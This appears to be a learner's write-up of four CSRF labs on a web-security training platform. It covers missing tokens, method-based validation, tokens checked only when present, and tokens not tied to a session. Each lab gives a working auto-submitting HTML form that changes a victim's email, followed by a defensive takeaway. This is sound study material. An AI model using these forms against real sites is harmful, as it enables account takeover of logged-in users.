## Lab 01: CSRF Vulnerability with No Defenses

This lab showed a basic CSRF vulnerability in the email change function.

The endpoint was:

```text
/my-account/change-email
```

It accepted a POST request with only an `email` parameter and did not require a CSRF token.

The exploit used an auto-submitting form:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="csrf-new@test.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

I first tested the exploit using **View exploit**, and it changed my own email.

Then I changed the email value and used **Deliver to victim**, which solved the lab.

### Key Takeaway

CSRF happens when a malicious page causes a logged-in user's browser to send an unwanted request.

If sensitive actions do not require a CSRF token, they can be triggered from another website.

## Lab 02: CSRF Where Token Validation Depends on Request Method

This lab showed a CSRF weakness caused by method-based validation.

The application checked the CSRF token when the email change request was sent as POST.

However, when the request was changed to GET, the token was not checked.

The exploit used a GET form:

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="csrf-method@test.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

Because the form had no `method` attribute, it submitted the request as GET.

### Key Takeaway

CSRF protection should not depend only on the request method.

Any request that changes data must require proper CSRF protection.


## Lab 03: CSRF Where Token Validation Depends on Token Being Present

This lab showed a CSRF flaw where the application only checked the CSRF token if it was present.

If the token value was wrong, the request was rejected.

But if the token parameter was removed completely, the request was accepted.

The exploit used a POST form without any CSRF token:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="csrf-missing@test.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

### Key Takeaway

A CSRF token must always be required for sensitive actions.

If the token is missing, the request should be rejected immediately.

## Lab 04: CSRF Where Token Is Not Tied to User Session

This lab showed a CSRF weakness where the token was valid but not linked to the user's session.

A secure CSRF token should only work with the session it was created for.

In this lab, a token from one account could be accepted in another user's request.

The exploit used a fresh unused CSRF token from my own account:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="csrf-session@test.com">
    <input type="hidden" name="csrf" value="FRESH-CSRF-TOKEN">
</form>

<script>
    document.forms[0].submit();
</script>
```

I copied the token from an intercepted request and dropped the request so the token would not be consumed.

Then I used the token in the exploit and delivered it to the victim.

### Key Takeaway

CSRF tokens must be tied to the user's session.

A valid token from one account should not work in another user's session.
